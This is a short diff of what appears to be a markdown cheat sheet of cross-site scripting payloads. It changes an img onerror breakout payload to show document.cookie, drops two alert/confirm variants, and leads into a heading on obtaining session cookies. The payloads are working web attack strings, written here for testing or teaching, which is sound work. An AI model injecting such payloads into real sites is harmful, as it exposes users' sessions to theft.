@@ -1,17 +1,8 @@
 ___
 
 ```js
-"><img src=x onerror=prompt(document.domain)>
+"><img src=x onerror=prompt(document.cookie)>
 ```
-
-```javascript
-"><img src=x onerror=confirm(1)>
-```
-
-```javascript
-"><img src=x onerror=alert(1)>
-```
-
 
 # Obtaining session cookies 
 
